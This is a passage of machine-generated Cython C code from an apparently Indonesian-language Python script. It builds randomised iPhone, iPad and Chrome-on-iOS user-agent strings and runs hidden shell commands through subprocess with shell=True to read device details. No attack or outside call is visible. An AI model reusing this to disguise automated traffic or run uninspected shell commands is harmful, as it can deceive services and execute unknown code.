            __Pyx_INCREF(__pyx_v_ua);
            __Pyx_GIVEREF(__pyx_v_ua);
            PyTuple_SET_ITEM(__pyx_t_7, 2+__pyx_t_13, __pyx_v_ua);
            __pyx_t_1 = 0;
            __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_t_7, NULL); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 161, __pyx_L13_error)
            __Pyx_GOTREF(__pyx_t_12);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          }
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_XDECREF_SET(__pyx_v_anj, __pyx_t_12);
          __pyx_t_12 = 0;

          
          __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_anj, __pyx_n_s_replace); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 162, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_re); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 162, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_14 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_findall); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 162, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_anj); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 162, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_15 = NULL;
          __pyx_t_13 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_14))) {
            __pyx_t_15 = PyMethod_GET_SELF(__pyx_t_14);
            if (likely(__pyx_t_15)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_14);
              __Pyx_INCREF(__pyx_t_15);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_14, function);
              __pyx_t_13 = 1;
            }
          }
          #if CYTHON_FAST_PYCALL
          if (PyFunction_Check(__pyx_t_14)) {
            PyObject *__pyx_temp[3] = {__pyx_t_15, __pyx_kp_s_CPU_iPhone_OS_like, __pyx_t_1};
            __pyx_t_7 = __Pyx_PyFunction_FastCall(__pyx_t_14, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 162, __pyx_L13_error)
            __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
            __Pyx_GOTREF(__pyx_t_7);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          } else
          #endif
          #if CYTHON_FAST_PYCCALL
          if (__Pyx_PyFastCFunction_Check(__pyx_t_14)) {
            PyObject *__pyx_temp[3] = {__pyx_t_15, __pyx_kp_s_CPU_iPhone_OS_like, __pyx_t_1};
            __pyx_t_7 = __Pyx_PyCFunction_FastCall(__pyx_t_14, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 162, __pyx_L13_error)
            __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
            __Pyx_GOTREF(__pyx_t_7);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          } else
          #endif
          {
            __pyx_t_16 = PyTuple_New(2+__pyx_t_13); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 162, __pyx_L13_error)
            __Pyx_GOTREF(__pyx_t_16);
            if (__pyx_t_15) {
              __Pyx_GIVEREF(__pyx_t_15); PyTuple_SET_ITEM(__pyx_t_16, 0, __pyx_t_15); __pyx_t_15 = NULL;
            }
            __Pyx_INCREF(__pyx_kp_s_CPU_iPhone_OS_like);
            __Pyx_GIVEREF(__pyx_kp_s_CPU_iPhone_OS_like);
            PyTuple_SET_ITEM(__pyx_t_16, 0+__pyx_t_13, __pyx_kp_s_CPU_iPhone_OS_like);
            __Pyx_GIVEREF(__pyx_t_1);
            PyTuple_SET_ITEM(__pyx_t_16, 1+__pyx_t_13, __pyx_t_1);
            __pyx_t_1 = 0;
            __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_14, __pyx_t_16, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 162, __pyx_L13_error)
            __Pyx_GOTREF(__pyx_t_7);
            __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          }
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __pyx_t_14 = __Pyx_GetItemInt(__pyx_t_7, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 162, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_7 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_versi_iphone); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 162, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_16 = NULL;
          __pyx_t_13 = 0;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
            __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_8);
            if (likely(__pyx_t_16)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
              __Pyx_INCREF(__pyx_t_16);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_8, function);
              __pyx_t_13 = 1;
            }
          }
          #if CYTHON_FAST_PYCALL
          if (PyFunction_Check(__pyx_t_8)) {
            PyObject *__pyx_temp[3] = {__pyx_t_16, __pyx_t_14, __pyx_t_7};
            __pyx_t_12 = __Pyx_PyFunction_FastCall(__pyx_t_8, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 162, __pyx_L13_error)
            __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
            __Pyx_GOTREF(__pyx_t_12);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          } else
          #endif
          #if CYTHON_FAST_PYCCALL
          if (__Pyx_PyFastCFunction_Check(__pyx_t_8)) {
            PyObject *__pyx_temp[3] = {__pyx_t_16, __pyx_t_14, __pyx_t_7};
            __pyx_t_12 = __Pyx_PyCFunction_FastCall(__pyx_t_8, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 162, __pyx_L13_error)
            __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
            __Pyx_GOTREF(__pyx_t_12);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          } else
          #endif
          {
            __pyx_t_1 = PyTuple_New(2+__pyx_t_13); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 162, __pyx_L13_error)
            __Pyx_GOTREF(__pyx_t_1);
            if (__pyx_t_16) {
              __Pyx_GIVEREF(__pyx_t_16); PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_16); __pyx_t_16 = NULL;
            }
            __Pyx_GIVEREF(__pyx_t_14);
            PyTuple_SET_ITEM(__pyx_t_1, 0+__pyx_t_13, __pyx_t_14);
            __Pyx_GIVEREF(__pyx_t_7);
            PyTuple_SET_ITEM(__pyx_t_1, 1+__pyx_t_13, __pyx_t_7);
            __pyx_t_14 = 0;
            __pyx_t_7 = 0;
            __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_t_1, NULL); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 162, __pyx_L13_error)
            __Pyx_GOTREF(__pyx_t_12);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          }
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_XDECREF_SET(__pyx_v_ugent, __pyx_t_12);
          __pyx_t_12 = 0;

          
          goto __pyx_L21;
        }

        
        __pyx_t_2 = (__Pyx_PySequence_ContainsTF(__pyx_kp_s_Mozilla_5_0_iPad, __pyx_v_ua, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 163, __pyx_L13_error)
        __pyx_t_3 = (__pyx_t_2 != 0);
        if (__pyx_t_3) {

          
          __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_random); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 164, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_randint); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 164, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_tuple__35, NULL); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 164, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_8 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_12); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 164, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __pyx_t_12 = PyNumber_Add(__pyx_t_8, __pyx_n_s__36); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 164, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_random); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 164, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_8);
          __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_randint); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 164, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__37, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 164, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_8); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 164, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_8 = PyNumber_Add(__pyx_t_12, __pyx_t_1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 164, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF_SET(__pyx_v_versi_iphone, __pyx_t_8);
          __pyx_t_8 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_re); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 165, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_sub); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 165, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_t_1 = PyTuple_New(3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 165, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_10 = 0;
          __pyx_t_11 = 127;
          __Pyx_INCREF(__pyx_kp_u_CriOS);
          __pyx_t_10 += 6;
          __Pyx_GIVEREF(__pyx_kp_u_CriOS);
          PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u_CriOS);
          __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_v_versi_chrome, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 165, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_11 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) > __pyx_t_11) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) : __pyx_t_11;
          __pyx_t_10 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
          __Pyx_GIVEREF(__pyx_t_7);
          PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_7);
          __pyx_t_7 = 0;
          __Pyx_INCREF(__pyx_kp_u_Mobile);
          __pyx_t_10 += 7;
          __Pyx_GIVEREF(__pyx_kp_u_Mobile);
          PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u_Mobile);
          __pyx_t_7 = __Pyx_PyUnicode_Join(__pyx_t_1, 3, __pyx_t_10, __pyx_t_11); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 165, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_t_1 = NULL;
          __pyx_t_13 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_12))) {
            __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_12);
            if (likely(__pyx_t_1)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
              __Pyx_INCREF(__pyx_t_1);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_12, function);
              __pyx_t_13 = 1;
            }
          }
          #if CYTHON_FAST_PYCALL
          if (PyFunction_Check(__pyx_t_12)) {
            PyObject *__pyx_temp[4] = {__pyx_t_1, __pyx_kp_s_CriOS_Mobile, __pyx_t_7, __pyx_v_ua};
            __pyx_t_8 = __Pyx_PyFunction_FastCall(__pyx_t_12, __pyx_temp+1-__pyx_t_13, 3+__pyx_t_13); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 165, __pyx_L13_error)
            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          } else
          #endif
          #if CYTHON_FAST_PYCCALL
          if (__Pyx_PyFastCFunction_Check(__pyx_t_12)) {
            PyObject *__pyx_temp[4] = {__pyx_t_1, __pyx_kp_s_CriOS_Mobile, __pyx_t_7, __pyx_v_ua};
            __pyx_t_8 = __Pyx_PyCFunction_FastCall(__pyx_t_12, __pyx_temp+1-__pyx_t_13, 3+__pyx_t_13); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 165, __pyx_L13_error)
            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          } else
          #endif
          {
            __pyx_t_14 = PyTuple_New(3+__pyx_t_13); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 165, __pyx_L13_error)
            __Pyx_GOTREF(__pyx_t_14);
            if (__pyx_t_1) {
              __Pyx_GIVEREF(__pyx_t_1); PyTuple_SET_ITEM(__pyx_t_14, 0, __pyx_t_1); __pyx_t_1 = NULL;
            }
            __Pyx_INCREF(__pyx_kp_s_CriOS_Mobile);
            __Pyx_GIVEREF(__pyx_kp_s_CriOS_Mobile);
            PyTuple_SET_ITEM(__pyx_t_14, 0+__pyx_t_13, __pyx_kp_s_CriOS_Mobile);
            __Pyx_GIVEREF(__pyx_t_7);
            PyTuple_SET_ITEM(__pyx_t_14, 1+__pyx_t_13, __pyx_t_7);
            __Pyx_INCREF(__pyx_v_ua);
            __Pyx_GIVEREF(__pyx_v_ua);
            PyTuple_SET_ITEM(__pyx_t_14, 2+__pyx_t_13, __pyx_v_ua);
            __pyx_t_7 = 0;
            __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_t_14, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 165, __pyx_L13_error)
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          }
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_XDECREF_SET(__pyx_v_anj, __pyx_t_8);
          __pyx_t_8 = 0;

          
          __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_anj, __pyx_n_s_replace); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 166, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_re); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 166, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_findall); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 166, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_7 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_anj); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 166, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_16 = NULL;
          __pyx_t_13 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
            __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_1);
            if (likely(__pyx_t_16)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
              __Pyx_INCREF(__pyx_t_16);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_1, function);
              __pyx_t_13 = 1;
            }
          }
          #if CYTHON_FAST_PYCALL
          if (PyFunction_Check(__pyx_t_1)) {
            PyObject *__pyx_temp[3] = {__pyx_t_16, __pyx_kp_s_CPU_OS_like, __pyx_t_7};
            __pyx_t_14 = __Pyx_PyFunction_FastCall(__pyx_t_1, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 166, __pyx_L13_error)
            __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          } else
          #endif
          #if CYTHON_FAST_PYCCALL
          if (__Pyx_PyFastCFunction_Check(__pyx_t_1)) {
            PyObject *__pyx_temp[3] = {__pyx_t_16, __pyx_kp_s_CPU_OS_like, __pyx_t_7};
            __pyx_t_14 = __Pyx_PyCFunction_FastCall(__pyx_t_1, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 166, __pyx_L13_error)
            __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          } else
          #endif
          {
            __pyx_t_15 = PyTuple_New(2+__pyx_t_13); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 166, __pyx_L13_error)
            __Pyx_GOTREF(__pyx_t_15);
            if (__pyx_t_16) {
              __Pyx_GIVEREF(__pyx_t_16); PyTuple_SET_ITEM(__pyx_t_15, 0, __pyx_t_16); __pyx_t_16 = NULL;
            }
            __Pyx_INCREF(__pyx_kp_s_CPU_OS_like);
            __Pyx_GIVEREF(__pyx_kp_s_CPU_OS_like);
            PyTuple_SET_ITEM(__pyx_t_15, 0+__pyx_t_13, __pyx_kp_s_CPU_OS_like);
            __Pyx_GIVEREF(__pyx_t_7);
            PyTuple_SET_ITEM(__pyx_t_15, 1+__pyx_t_13, __pyx_t_7);
            __pyx_t_7 = 0;
            __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_15, NULL); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 166, __pyx_L13_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
          }
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_t_1 = __Pyx_GetItemInt(__pyx_t_14, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 166, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __pyx_t_14 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_versi_iphone); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 166, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_14);
          __pyx_t_15 = NULL;
          __pyx_t_13 = 0;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
            __pyx_t_15 = PyMethod_GET_SELF(__pyx_t_12);
            if (likely(__pyx_t_15)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
              __Pyx_INCREF(__pyx_t_15);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_12, function);
              __pyx_t_13 = 1;
            }
          }
          #if CYTHON_FAST_PYCALL
          if (PyFunction_Check(__pyx_t_12)) {
            PyObject *__pyx_temp[3] = {__pyx_t_15, __pyx_t_1, __pyx_t_14};
            __pyx_t_8 = __Pyx_PyFunction_FastCall(__pyx_t_12, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 166, __pyx_L13_error)
            __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          } else
          #endif
          #if CYTHON_FAST_PYCCALL
          if (__Pyx_PyFastCFunction_Check(__pyx_t_12)) {
            PyObject *__pyx_temp[3] = {__pyx_t_15, __pyx_t_1, __pyx_t_14};
            __pyx_t_8 = __Pyx_PyCFunction_FastCall(__pyx_t_12, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 166, __pyx_L13_error)
            __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          } else
          #endif
          {
            __pyx_t_7 = PyTuple_New(2+__pyx_t_13); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 166, __pyx_L13_error)
            __Pyx_GOTREF(__pyx_t_7);
            if (__pyx_t_15) {
              __Pyx_GIVEREF(__pyx_t_15); PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_t_15); __pyx_t_15 = NULL;
            }
            __Pyx_GIVEREF(__pyx_t_1);
            PyTuple_SET_ITEM(__pyx_t_7, 0+__pyx_t_13, __pyx_t_1);
            __Pyx_GIVEREF(__pyx_t_14);
            PyTuple_SET_ITEM(__pyx_t_7, 1+__pyx_t_13, __pyx_t_14);
            __pyx_t_1 = 0;
            __pyx_t_14 = 0;
            __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_t_7, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 166, __pyx_L13_error)
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          }
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_XDECREF_SET(__pyx_v_ugent, __pyx_t_8);
          __pyx_t_8 = 0;

          
          goto __pyx_L21;
        }

        
        __pyx_t_3 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_myua, __pyx_v_ua, Py_EQ)); if (unlikely(__pyx_t_3 < 0)) __PYX_ERR(0, 167, __pyx_L13_error)
        __pyx_t_2 = (__pyx_t_3 != 0);
        if (__pyx_t_2) {

          
          __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_subprocess); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 168, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_check_output); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 168, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __pyx_t_12 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 168, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          if (PyDict_SetItem(__pyx_t_12, __pyx_n_s_shell, Py_True) < 0) __PYX_ERR(0, 168, __pyx_L13_error)
          __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__38, __pyx_t_12); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 168, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_14, __pyx_n_s_decode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 168, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __pyx_t_14 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
            __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_12);
            if (likely(__pyx_t_14)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
              __Pyx_INCREF(__pyx_t_14);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_12, function);
            }
          }
          __pyx_t_8 = (__pyx_t_14) ? __Pyx_PyObject_Call2Args(__pyx_t_12, __pyx_t_14, __pyx_kp_s_utf_8) : __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_kp_s_utf_8);
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 168, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_replace); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 168, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_tuple__40, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 168, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_XDECREF_SET(__pyx_v_model_device, __pyx_t_8);
          __pyx_t_8 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_subprocess); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 169, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __pyx_t_14 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_check_output); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 169, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __pyx_t_12 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 169, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          if (PyDict_SetItem(__pyx_t_12, __pyx_n_s_shell, Py_True) < 0) __PYX_ERR(0, 169, __pyx_L13_error)
          __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_14, __pyx_tuple__41, __pyx_t_12); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 169, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_decode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 169, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_7 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
            __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_12);
